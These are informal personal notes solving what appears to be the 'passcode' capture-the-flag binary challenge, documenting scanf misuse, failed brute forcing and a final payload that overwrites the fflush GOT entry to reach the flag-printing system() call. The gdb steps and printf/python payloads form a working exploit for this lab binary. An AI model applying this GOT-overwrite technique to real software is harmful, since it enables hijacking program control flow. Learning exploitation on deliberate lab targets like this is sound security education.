
- OK! So I compiled with symbols - I notices that the program is using scanf, but instead of &int, it used int! That means that the data I will use will change the POINTER and not the VALUE.
- OK it's payload time:
`printf "%b" '\x42\x42\x42\x42\x0a\x0a\x42\x42\x42\x42\x0a' > data.bin`
- Breakpoint time: 'b passcode.c:8'
- Let's read the pointer of passcode1: 'p/x &passcode1'

- There is a problem with inputing there, but I definetly just need to input addresses instead of values that will point to the values needed.

- Using 'p/d $rdx' after the code crash - I can see my data!
11111111111111

- Looking in the wild:
(gdb) p/d &passcode1
$4 = 140737488347036
- Let's try using this value and see if the code isn't crashing
- Still crashing for some reason :(
- OK I get it now, this is the line:
mov    DWORD PTR [rax],edx

- edx holds my data, rax holds the VALUE of passcode1 - which is not a pointer, and an invalid place in memory

- Placing a breakpoint on:
b *__vfscanf_internal+17607
this is the line I just saw inside of scanf - "mov    DWORD PTR [rax],edx"

- Placing 'a' instead of a number - skips the first scanf somehow, and don't allow me to input the second time and fails the check..
- StackOverFlow for the help - ""%d" expects numeric input like (white-spaces)(sign)[digits]. If the user does not type that, nothing is read and text remains in stdin for the next input function"
- I also read that 'fflush(stdin);' have undefined behavior on some platforms - maybe it's a thing too.

- AHAH! Look at this StackOverFlow comment:

char buf[10] = {0};
scanf("%10s", buf);

is unsafe. You have to take into account the string null terminator.

- It's simillar to what we have. Maybe I can do something with it.
- I am not sure what I can do with it yet, but techincly if I use 100 characters I can make the null terminator something else, which will make the string not a string? I am not sure what will happend then yet, I need to look into the memory for it. BUT it's late :( SO let's go to sleep.

- HAHA! I was trying to make things work - but then I got it!
I was h"hing my symbold code! Which is probably defending me from such vlunrabilites. I gdb'd the original binary, and managed to overwrite the "default" values of passcode1 and passcode2!

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


- NICE! I managed to pass the first check with the following payload!
- `printf "%b" '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe6\x28\x05\x00' > payload.bin`

- Adding bytes are not allowing me to overright the second value :(

- I was thinking about BF the second one:
while [ 1 -le 2 ]
do
	cat payload.bin | ~/passcode
done 

- I made 700,000 tries - didn't make it yet. I think there is maybe a better way - because the int size (aka number of options) is 4,294,967,296. I am also not sure it's possibol for the "junk value" to just be the one I need. 
- I will just say that the source code has a comment that says the following:
"ha! mommy told me that 32bit is vulnerable to bruteforcing :)"
So.. maybe?

- Does not seem like it works, sadly. atleast not for now. I can try running it all night, but let's try some more exploits before that.

- The hex value I need to reach is 0xcc07c9 - but I see in the stack that the word ends with 00 - which means I won't be able to get that value randomly :( (0xcc07c9 != 0xcc07c900). I need some time on a diffrent pwn.

- Some time has passed, I actually looked up a writeup to see if a BF is the option here and I was just unlucky. I sadly saw something I SHOULD NOT see. That there is a way to overwrite fflush. I didn't see how - so let's do it myself. I still think that we can use BF by the way.

- OK so I have seen the writeup. I was really intriged by how can I overwrite the GOT without messing up with the binary.

- The solution was really cool, I definetly would rather make it myself, but I already did that :(

- The idea is that: scanf takes input from the user and places it in memory - inside of an address passed in it's args. 

- Here we have control over both. We have control of the address to write into (as I did a long time ago, in order to change passcode1 to 338150) and, the thing that I missed and the writeup did not - I CAN ALSO CONTROL THE INPUT! because, every data I will put in the payload after that, will not go into memeory as part of "name", BUT will go into stdin - as he input for passcode1!

- SO I acctually need to find the address inside of the GOT for fflush, and then find the address I want to jmp into instead, the one that reads the flag.

- Let's find them (myself, without the writeup)

- In order to find the fflush pointer, I disassembled my code. I saw the following line:
`call   0x8048430 <fflush@plt>`

- Using x/i I can see the instruction is:
`0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004`

- So 0x804a004 is the PLT address 

- Now let's look for the flag line - looking into the disassemble again:
```
0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:	call   0x8048460 <system@plt>
```

- I need to use the line that changes esp before the function call: 0x080485e3

- (saw this on the writeup) I need to pass it as a number, so let's convert 0x080485e3 into decimal: 
`p/d 0x080485e3`

- Another cool thing I learned, is that python is better then printf in creating payloads!

`python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" > payload2.bin`

- # Anddd flag: "Sorry mom.. I got confused about scanf usage :("
- # pwned.

- P.S.
I am sad that I had to look up a hint, a pretty big one too.. Shouldn't do it next time.